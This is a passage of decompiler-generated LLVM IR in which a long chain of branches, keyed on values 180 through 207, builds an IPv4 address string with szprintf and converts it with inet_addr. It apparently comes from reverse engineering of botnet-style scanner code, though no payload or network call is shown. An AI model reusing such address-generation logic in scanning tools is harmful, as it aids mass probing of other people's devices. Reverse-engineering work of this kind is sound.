  %v3_d00c = load i8, i8* @global_var_324e1.75, align 1
  %v3_d018 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d024 = sext i8 %v3_d00c to i32
  %v6_d024 = sext i8 %v3_d018 to i32
  %v8_d024 = call i32 @szprintf(i32 %v2_d000, i32 ptrtoint ([13 x i8]* @global_var_244c8.419 to i32), i32 %v4_d024, i32 %v6_d024, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d000
  %v7_d02c = icmp eq i32 %v2_a95c, 180
  br i1 %v7_d02c, label %dec_label_pc_d034, label %dec_label_pc_d05c

dec_label_pc_d034:                                ; preds = %dec_label_pc_d028
  %v2_d034 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d040 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d04c = load i8, i8* @global_var_324e2.76, align 1
  %v4_d058 = sext i8 %v3_d040 to i32
  %v6_d058 = sext i8 %v3_d04c to i32
  %v8_d058 = call i32 @szprintf(i32 %v2_d034, i32 ptrtoint ([13 x i8]* @global_var_244d8.421 to i32), i32 %v4_d058, i32 %v6_d058, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d05c

dec_label_pc_d05c:                                ; preds = %dec_label_pc_d028, %dec_label_pc_d034
  %v7_d060 = icmp eq i32 %v2_a95c, 181
  br i1 %v7_d060, label %dec_label_pc_d068, label %dec_label_pc_d090

dec_label_pc_d068:                                ; preds = %dec_label_pc_d05c
  %v2_d068 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d074 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d080 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d08c = sext i8 %v3_d074 to i32
  %v6_d08c = sext i8 %v3_d080 to i32
  %v8_d08c = call i32 @szprintf(i32 %v2_d068, i32 ptrtoint ([13 x i8]* @global_var_244e8.423 to i32), i32 %v4_d08c, i32 %v6_d08c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d090

dec_label_pc_d090:                                ; preds = %dec_label_pc_d05c, %dec_label_pc_d068
  %v7_d094 = icmp eq i32 %v2_a95c, 182
  br i1 %v7_d094, label %dec_label_pc_d09c, label %dec_label_pc_d0c4

dec_label_pc_d09c:                                ; preds = %dec_label_pc_d090
  %v2_d09c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0a8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d0b4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d0c0 = sext i8 %v3_d0a8 to i32
  %v6_d0c0 = sext i8 %v3_d0b4 to i32
  %v8_d0c0 = call i32 @szprintf(i32 %v2_d09c, i32 ptrtoint ([13 x i8]* @global_var_244f8.425 to i32), i32 %v4_d0c0, i32 %v6_d0c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0c4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d090, %dec_label_pc_d09c
  %v7_d0c8 = icmp eq i32 %v2_a95c, 183
  br i1 %v7_d0c8, label %dec_label_pc_d0d0, label %dec_label_pc_d0f8

dec_label_pc_d0d0:                                ; preds = %dec_label_pc_d0c4
  %v2_d0d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0dc = load i8, i8* @global_var_324e1.75, align 1
  %v3_d0e8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d0f4 = sext i8 %v3_d0dc to i32
  %v6_d0f4 = sext i8 %v3_d0e8 to i32
  %v8_d0f4 = call i32 @szprintf(i32 %v2_d0d0, i32 ptrtoint ([13 x i8]* @global_var_23cf8.164 to i32), i32 %v4_d0f4, i32 %v6_d0f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0f8

dec_label_pc_d0f8:                                ; preds = %dec_label_pc_d0c4, %dec_label_pc_d0d0
  %v7_d0fc = icmp eq i32 %v2_a95c, 184
  br i1 %v7_d0fc, label %dec_label_pc_d104, label %dec_label_pc_d12c

dec_label_pc_d104:                                ; preds = %dec_label_pc_d0f8
  %v2_d104 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d110 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d11c = load i8, i8* @global_var_324e2.76, align 1
  %v4_d128 = sext i8 %v3_d110 to i32
  %v6_d128 = sext i8 %v3_d11c to i32
  %v8_d128 = call i32 @szprintf(i32 %v2_d104, i32 ptrtoint ([13 x i8]* @global_var_24508.428 to i32), i32 %v4_d128, i32 %v6_d128, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %dec_label_pc_d0f8, %dec_label_pc_d104
  %v7_d130 = icmp eq i32 %v2_a95c, 185
  br i1 %v7_d130, label %dec_label_pc_d138, label %dec_label_pc_d160

dec_label_pc_d138:                                ; preds = %dec_label_pc_d12c
  %v2_d138 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d144 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d150 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d15c = sext i8 %v3_d144 to i32
  %v6_d15c = sext i8 %v3_d150 to i32
  %v8_d15c = call i32 @szprintf(i32 %v2_d138, i32 ptrtoint ([13 x i8]* @global_var_24518.430 to i32), i32 %v4_d15c, i32 %v6_d15c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d160

dec_label_pc_d160:                                ; preds = %dec_label_pc_d12c, %dec_label_pc_d138
  %v7_d164 = icmp eq i32 %v2_a95c, 186
  br i1 %v7_d164, label %dec_label_pc_d16c, label %dec_label_pc_d194

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d160
  %v2_d16c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d178 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d184 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d190 = sext i8 %v3_d178 to i32
  %v6_d190 = sext i8 %v3_d184 to i32
  %v8_d190 = call i32 @szprintf(i32 %v2_d16c, i32 ptrtoint ([14 x i8]* @global_var_24528.432 to i32), i32 %v4_d190, i32 %v6_d190, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %dec_label_pc_d160, %dec_label_pc_d16c
  %v7_d198 = icmp eq i32 %v2_a95c, 187
  br i1 %v7_d198, label %dec_label_pc_d1a0, label %dec_label_pc_d1c8

dec_label_pc_d1a0:                                ; preds = %dec_label_pc_d194
  %v2_d1a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1ac = load i8, i8* @global_var_324e1.75, align 1
  %v3_d1b8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d1c4 = sext i8 %v3_d1ac to i32
  %v6_d1c4 = sext i8 %v3_d1b8 to i32
  %v8_d1c4 = call i32 @szprintf(i32 %v2_d1a0, i32 ptrtoint ([14 x i8]* @global_var_24538.434 to i32), i32 %v4_d1c4, i32 %v6_d1c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1c8

dec_label_pc_d1c8:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d1a0
  %v7_d1cc = icmp eq i32 %v2_a95c, 188
  br i1 %v7_d1cc, label %dec_label_pc_d1d4, label %dec_label_pc_d1fc

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1c8
  %v2_d1d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1e0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d1ec = load i8, i8* @global_var_324e2.76, align 1
  %v4_d1f8 = sext i8 %v3_d1e0 to i32
  %v6_d1f8 = sext i8 %v3_d1ec to i32
  %v8_d1f8 = call i32 @szprintf(i32 %v2_d1d4, i32 ptrtoint ([14 x i8]* @global_var_24548.436 to i32), i32 %v4_d1f8, i32 %v6_d1f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1fc

dec_label_pc_d1fc:                                ; preds = %dec_label_pc_d1c8, %dec_label_pc_d1d4
  %v7_d200 = icmp eq i32 %v2_a95c, 189
  br i1 %v7_d200, label %dec_label_pc_d208, label %dec_label_pc_d230

dec_label_pc_d208:                                ; preds = %dec_label_pc_d1fc
  %v2_d208 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d214 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d220 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d22c = sext i8 %v3_d214 to i32
  %v6_d22c = sext i8 %v3_d220 to i32
  %v8_d22c = call i32 @szprintf(i32 %v2_d208, i32 ptrtoint ([14 x i8]* @global_var_24558.438 to i32), i32 %v4_d22c, i32 %v6_d22c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d1fc, %dec_label_pc_d208
  %v7_d234 = icmp eq i32 %v2_a95c, 190
  br i1 %v7_d234, label %dec_label_pc_d23c, label %dec_label_pc_d264

dec_label_pc_d23c:                                ; preds = %dec_label_pc_d230
  %v2_d23c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d248 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d254 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d260 = sext i8 %v3_d248 to i32
  %v6_d260 = sext i8 %v3_d254 to i32
  %v8_d260 = call i32 @szprintf(i32 %v2_d23c, i32 ptrtoint ([14 x i8]* @global_var_24568.440 to i32), i32 %v4_d260, i32 %v6_d260, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d230, %dec_label_pc_d23c
  %v7_d268 = icmp eq i32 %v2_a95c, 191
  br i1 %v7_d268, label %dec_label_pc_d270, label %dec_label_pc_d298

dec_label_pc_d270:                                ; preds = %dec_label_pc_d264
  %v2_d270 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d27c = load i8, i8* @global_var_324e1.75, align 1
  %v3_d288 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d294 = sext i8 %v3_d27c to i32
  %v6_d294 = sext i8 %v3_d288 to i32
  %v8_d294 = call i32 @szprintf(i32 %v2_d270, i32 ptrtoint ([14 x i8]* @global_var_24578.442 to i32), i32 %v4_d294, i32 %v6_d294, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d264, %dec_label_pc_d270
  %v7_d29c = icmp eq i32 %v2_a95c, 192
  br i1 %v7_d29c, label %dec_label_pc_d2a4, label %dec_label_pc_d2cc

dec_label_pc_d2a4:                                ; preds = %dec_label_pc_d298
  %v2_d2a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2b0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d2bc = load i8, i8* @global_var_324e2.76, align 1
  %v4_d2c8 = sext i8 %v3_d2b0 to i32
  %v6_d2c8 = sext i8 %v3_d2bc to i32
  %v8_d2c8 = call i32 @szprintf(i32 %v2_d2a4, i32 ptrtoint ([13 x i8]* @global_var_24588.444 to i32), i32 %v4_d2c8, i32 %v6_d2c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2cc

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d298, %dec_label_pc_d2a4
  %v7_d2d0 = icmp eq i32 %v2_a95c, 193
  br i1 %v7_d2d0, label %dec_label_pc_d2d8, label %dec_label_pc_d300

dec_label_pc_d2d8:                                ; preds = %dec_label_pc_d2cc
  %v2_d2d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2e4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d2f0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d2fc = sext i8 %v3_d2e4 to i32
  %v6_d2fc = sext i8 %v3_d2f0 to i32
  %v8_d2fc = call i32 @szprintf(i32 %v2_d2d8, i32 ptrtoint ([13 x i8]* @global_var_24598.446 to i32), i32 %v4_d2fc, i32 %v6_d2fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d300

dec_label_pc_d300:                                ; preds = %dec_label_pc_d2cc, %dec_label_pc_d2d8
  %v7_d304 = icmp eq i32 %v2_a95c, 194
  br i1 %v7_d304, label %dec_label_pc_d30c, label %dec_label_pc_d334

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d300
  %v2_d30c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d318 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d324 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d330 = sext i8 %v3_d318 to i32
  %v6_d330 = sext i8 %v3_d324 to i32
  %v8_d330 = call i32 @szprintf(i32 %v2_d30c, i32 ptrtoint ([14 x i8]* @global_var_245a8.448 to i32), i32 %v4_d330, i32 %v6_d330, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d334

dec_label_pc_d334:                                ; preds = %dec_label_pc_d300, %dec_label_pc_d30c
  %v7_d338 = icmp eq i32 %v2_a95c, 195
  br i1 %v7_d338, label %dec_label_pc_d340, label %dec_label_pc_d368

dec_label_pc_d340:                                ; preds = %dec_label_pc_d334
  %v2_d340 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d34c = load i8, i8* @global_var_324e1.75, align 1
  %v3_d358 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d364 = sext i8 %v3_d34c to i32
  %v6_d364 = sext i8 %v3_d358 to i32
  %v8_d364 = call i32 @szprintf(i32 %v2_d340, i32 ptrtoint ([14 x i8]* @global_var_245b8.450 to i32), i32 %v4_d364, i32 %v6_d364, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d368

dec_label_pc_d368:                                ; preds = %dec_label_pc_d334, %dec_label_pc_d340
  %v7_d36c = icmp eq i32 %v2_a95c, 196
  br i1 %v7_d36c, label %dec_label_pc_d374, label %dec_label_pc_d39c

dec_label_pc_d374:                                ; preds = %dec_label_pc_d368
  %v2_d374 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d380 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d38c = load i8, i8* @global_var_324e2.76, align 1
  %v4_d398 = sext i8 %v3_d380 to i32
  %v6_d398 = sext i8 %v3_d38c to i32
  %v8_d398 = call i32 @szprintf(i32 %v2_d374, i32 ptrtoint ([14 x i8]* @global_var_245c8.452 to i32), i32 %v4_d398, i32 %v6_d398, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d39c

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d368, %dec_label_pc_d374
  %v7_d3a0 = icmp eq i32 %v2_a95c, 197
  br i1 %v7_d3a0, label %dec_label_pc_d3a8, label %dec_label_pc_d3d0

dec_label_pc_d3a8:                                ; preds = %dec_label_pc_d39c
  %v2_d3a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3b4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d3c0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d3cc = sext i8 %v3_d3b4 to i32
  %v6_d3cc = sext i8 %v3_d3c0 to i32
  %v8_d3cc = call i32 @szprintf(i32 %v2_d3a8, i32 ptrtoint ([14 x i8]* @global_var_245d8.454 to i32), i32 %v4_d3cc, i32 %v6_d3cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3d0

dec_label_pc_d3d0:                                ; preds = %dec_label_pc_d39c, %dec_label_pc_d3a8
  %v7_d3d4 = icmp eq i32 %v2_a95c, 198
  br i1 %v7_d3d4, label %dec_label_pc_d3dc, label %dec_label_pc_d404

dec_label_pc_d3dc:                                ; preds = %dec_label_pc_d3d0
  %v2_d3dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3e8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d3f4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d400 = sext i8 %v3_d3e8 to i32
  %v6_d400 = sext i8 %v3_d3f4 to i32
  %v8_d400 = call i32 @szprintf(i32 %v2_d3dc, i32 ptrtoint ([14 x i8]* @global_var_245e8.456 to i32), i32 %v4_d400, i32 %v6_d400, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d404

dec_label_pc_d404:                                ; preds = %dec_label_pc_d3d0, %dec_label_pc_d3dc
  %v7_d408 = icmp eq i32 %v2_a95c, 199
  br i1 %v7_d408, label %dec_label_pc_d410, label %dec_label_pc_d438

dec_label_pc_d410:                                ; preds = %dec_label_pc_d404
  %v2_d410 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d41c = load i8, i8* @global_var_324e1.75, align 1
  %v3_d428 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d434 = sext i8 %v3_d41c to i32
  %v6_d434 = sext i8 %v3_d428 to i32
  %v8_d434 = call i32 @szprintf(i32 %v2_d410, i32 ptrtoint ([14 x i8]* @global_var_245f8.458 to i32), i32 %v4_d434, i32 %v6_d434, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d438

dec_label_pc_d438:                                ; preds = %dec_label_pc_d404, %dec_label_pc_d410
  %v7_d43c = icmp eq i32 %v2_a95c, 200
  br i1 %v7_d43c, label %dec_label_pc_d444, label %dec_label_pc_d46c

dec_label_pc_d444:                                ; preds = %dec_label_pc_d438
  %v2_d444 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d450 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d45c = load i8, i8* @global_var_324e2.76, align 1
  %v4_d468 = sext i8 %v3_d450 to i32
  %v6_d468 = sext i8 %v3_d45c to i32
  %v8_d468 = call i32 @szprintf(i32 %v2_d444, i32 ptrtoint ([14 x i8]* @global_var_24608.460 to i32), i32 %v4_d468, i32 %v6_d468, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d46c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d438, %dec_label_pc_d444
  %v7_d470 = icmp eq i32 %v2_a95c, 201
  br i1 %v7_d470, label %dec_label_pc_d4ac, label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %dec_label_pc_d46c
  br label %dec_label_pc_d4d4

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d46c
  %v2_d478 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d484 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d490 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d49c = sext i8 %v3_d484 to i32
  %v6_d49c = sext i8 %v3_d490 to i32
  %v8_d49c = call i32 @szprintf(i32 %v2_d478, i32 ptrtoint ([14 x i8]* @global_var_24618.462 to i32), i32 %v4_d49c, i32 %v6_d49c, i32 ptrtoint (i32* @0 to i32))
  %v3_d4b8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d4c4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d4d0 = sext i8 %v3_d4b8 to i32
  %v6_d4d0 = sext i8 %v3_d4c4 to i32
  %v8_d4d0 = call i32 @szprintf(i32 %v2_d478, i32 ptrtoint ([13 x i8]* @global_var_24628.464 to i32), i32 %v4_d4d0, i32 %v6_d4d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4d4

dec_label_pc_d4d4:                                ; preds = %dec_label_pc_d4a0, %dec_label_pc_d4ac
  %v7_d4d8 = icmp eq i32 %v2_a95c, 202
  br i1 %v7_d4d8, label %dec_label_pc_d4e0, label %dec_label_pc_d508

dec_label_pc_d4e0:                                ; preds = %dec_label_pc_d4d4
  %v2_d4e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4ec = load i8, i8* @global_var_324e1.75, align 1
  %v3_d4f8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d504 = sext i8 %v3_d4ec to i32
  %v6_d504 = sext i8 %v3_d4f8 to i32
  %v8_d504 = call i32 @szprintf(i32 %v2_d4e0, i32 ptrtoint ([13 x i8]* @global_var_24638.466 to i32), i32 %v4_d504, i32 %v6_d504, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d508

dec_label_pc_d508:                                ; preds = %dec_label_pc_d4d4, %dec_label_pc_d4e0
  %v7_d50c = icmp eq i32 %v2_a95c, 203
  br i1 %v7_d50c, label %dec_label_pc_d514, label %dec_label_pc_d53c

dec_label_pc_d514:                                ; preds = %dec_label_pc_d508
  %v2_d514 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d520 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d52c = load i8, i8* @global_var_324e2.76, align 1
  %v4_d538 = sext i8 %v3_d520 to i32
  %v6_d538 = sext i8 %v3_d52c to i32
  %v8_d538 = call i32 @szprintf(i32 %v2_d514, i32 ptrtoint ([13 x i8]* @global_var_24648.468 to i32), i32 %v4_d538, i32 %v6_d538, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d53c

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d508, %dec_label_pc_d514
  %v7_d540 = icmp eq i32 %v2_a95c, 204
  br i1 %v7_d540, label %dec_label_pc_d548, label %dec_label_pc_d570

dec_label_pc_d548:                                ; preds = %dec_label_pc_d53c
  %v2_d548 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d554 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d560 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d56c = sext i8 %v3_d554 to i32
  %v6_d56c = sext i8 %v3_d560 to i32
  %v8_d56c = call i32 @szprintf(i32 %v2_d548, i32 ptrtoint ([13 x i8]* @global_var_24658.470 to i32), i32 %v4_d56c, i32 %v6_d56c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %dec_label_pc_d53c, %dec_label_pc_d548
  %v7_d574 = icmp eq i32 %v2_a95c, 205
  br i1 %v7_d574, label %dec_label_pc_d57c, label %dec_label_pc_d5a4

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d570
  %v2_d57c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d588 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d594 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d5a0 = sext i8 %v3_d588 to i32
  %v6_d5a0 = sext i8 %v3_d594 to i32
  %v8_d5a0 = call i32 @szprintf(i32 %v2_d57c, i32 ptrtoint ([13 x i8]* @global_var_24668.472 to i32), i32 %v4_d5a0, i32 %v6_d5a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d57c
  %v7_d5a8 = icmp eq i32 %v2_a95c, 206
  br i1 %v7_d5a8, label %dec_label_pc_d5b0, label %dec_label_pc_d5d8

dec_label_pc_d5b0:                                ; preds = %dec_label_pc_d5a4
  %v2_d5b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d5bc = load i8, i8* @global_var_324e1.75, align 1
  %v3_d5c8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_d5d4 = sext i8 %v3_d5bc to i32
  %v6_d5d4 = sext i8 %v3_d5c8 to i32
  %v8_d5d4 = call i32 @szprintf(i32 %v2_d5b0, i32 ptrtoint ([13 x i8]* @global_var_24678.474 to i32), i32 %v4_d5d4, i32 %v6_d5d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5a4, %dec_label_pc_d5b0
  %v7_d5dc = icmp eq i32 %v2_a95c, 207
  %v2_d5e4 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v7_d5dc, label %dec_label_pc_d5e4, label %dec_label_pc_d60c

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5d8
  %v3_d5f0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_d5fc = load i8, i8* @global_var_324e2.76, align 1
  %v4_d608 = sext i8 %v3_d5f0 to i32
  %v6_d608 = sext i8 %v3_d5fc to i32
  %v8_d608 = call i32 @szprintf(i32 %v2_d5e4, i32 ptrtoint ([14 x i8]* @global_var_24688.476 to i32), i32 %v4_d608, i32 %v6_d608, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d5d8, %dec_label_pc_d5e4
  br i1 false, label %dec_label_pc_d618, label %dec_label_pc_d640

dec_label_pc_d618:                                ; preds = %dec_label_pc_d60c
  br label %dec_label_pc_d640

dec_label_pc_d640:                                ; preds = %dec_label_pc_d60c, %dec_label_pc_d618
  store i32 %v2_d5e4, i32* @r0, align 4
  %v1_d648 = call i32 @inet_addr(i32 %v2_d5e4)
  store i32 %v3_a7d8, i32* @fp, align 4
  ret i32 %v1_d648

; uselistorder directives
  uselistorder i32 %v2_d5e4, { 1, 0, 2 }
  uselistorder i32 %v0_a8f8, { 1, 0 }
  uselistorder i32 %v0_a8ac, { 1, 0 }
  uselistorder i32 %v0_a860, { 1, 0 }
  uselistorder i32 %v0_a814, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_243b8.385 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_2434c.370 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_241bc.319 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_24130.301 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_240d0.289 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_23d18.168 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_23cf8.164 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_23ce8.162 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_23cb8.156 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_d640, { 1, 0 }
  uselistorder label %dec_label_pc_d60c, { 1, 0 }
  uselistorder label %dec_label_pc_d5d8, { 1, 0 }
  uselistorder label %dec_label_pc_d5a4, { 1, 0 }
  uselistorder label %dec_label_pc_d570, { 1, 0 }
  uselistorder label %dec_label_pc_d53c, { 1, 0 }
  uselistorder label %dec_label_pc_d508, { 1, 0 }
  uselistorder label %dec_label_pc_d4d4, { 1, 0 }
  uselistorder label %dec_label_pc_d46c, { 1, 0 }
  uselistorder label %dec_label_pc_d438, { 1, 0 }
  uselistorder label %dec_label_pc_d404, { 1, 0 }
  uselistorder label %dec_label_pc_d3d0, { 1, 0 }
  uselistorder label %dec_label_pc_d39c, { 1, 0 }
  uselistorder label %dec_label_pc_d368, { 1, 0 }
  uselistorder label %dec_label_pc_d334, { 1, 0 }
  uselistorder label %dec_label_pc_d300, { 1, 0 }
  uselistorder label %dec_label_pc_d2cc, { 1, 0 }
  uselistorder label %dec_label_pc_d298, { 1, 0 }
  uselistorder label %dec_label_pc_d264, { 1, 0 }
  uselistorder label %dec_label_pc_d230, { 1, 0 }
  uselistorder label %dec_label_pc_d1fc, { 1, 0 }
  uselistorder label %dec_label_pc_d1c8, { 1, 0 }
  uselistorder label %dec_label_pc_d194, { 1, 0 }
  uselistorder label %dec_label_pc_d160, { 1, 0 }
  uselistorder label %dec_label_pc_d12c, { 1, 0 }
  uselistorder label %dec_label_pc_d0f8, { 1, 0 }
  uselistorder label %dec_label_pc_d0c4, { 1, 0 }
  uselistorder label %dec_label_pc_d090, { 1, 0 }
  uselistorder label %dec_label_pc_d05c, { 1, 0 }
  uselistorder label %dec_label_pc_d028, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
  uselistorder label %dec_label_pc_cfc0, { 1, 0 }
  uselistorder label %dec_label_pc_cf8c, { 1, 0 }
  uselistorder label %dec_label_pc_cf58, { 1, 0 }
  uselistorder label %dec_label_pc_cf24, { 1, 0 }
  uselistorder label %dec_label_pc_cef0, { 1, 0 }
  uselistorder label %dec_label_pc_cebc, { 1, 0 }
  uselistorder label %dec_label_pc_ce88, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 0 }
  uselistorder label %dec_label_pc_ce20, { 1, 0 }
  uselistorder label %dec_label_pc_cdec, { 1, 0 }
  uselistorder label %dec_label_pc_cdb8, { 1, 0 }
  uselistorder label %dec_label_pc_cd84, { 1, 0 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
  uselistorder label %dec_label_pc_cd1c, { 1, 0 }
  uselistorder label %dec_label_pc_cce8, { 1, 0 }
  uselistorder label %dec_label_pc_ccb4, { 1, 0 }
  uselistorder label %dec_label_pc_cc80, { 1, 0 }
  uselistorder label %dec_label_pc_cc4c, { 1, 0 }
  uselistorder label %dec_label_pc_cc18, { 1, 0 }
  uselistorder label %dec_label_pc_cbe4, { 1, 0 }
  uselistorder label %dec_label_pc_cbb0, { 1, 0 }
  uselistorder label %dec_label_pc_cb7c, { 1, 0 }
  uselistorder label %dec_label_pc_cb48, { 1, 0 }
  uselistorder label %dec_label_pc_cb14, { 1, 0 }
  uselistorder label %dec_label_pc_cae0, { 1, 0 }
  uselistorder label %dec_label_pc_caac, { 1, 0 }
  uselistorder label %dec_label_pc_ca78, { 1, 0 }
  uselistorder label %dec_label_pc_ca44, { 1, 0 }
  uselistorder label %dec_label_pc_ca10, { 1, 0 }
  uselistorder label %dec_label_pc_c9dc, { 1, 0 }
  uselistorder label %dec_label_pc_c9a8, { 1, 0 }
  uselistorder label %dec_label_pc_c974, { 1, 0 }
  uselistorder label %dec_label_pc_c940, { 1, 0 }
  uselistorder label %dec_label_pc_c90c, { 1, 0 }
  uselistorder label %dec_label_pc_c8d8, { 1, 0 }
  uselistorder label %dec_label_pc_c8a4, { 1, 0 }
  uselistorder label %dec_label_pc_c870, { 1, 0 }
  uselistorder label %dec_label_pc_c83c, { 1, 0 }
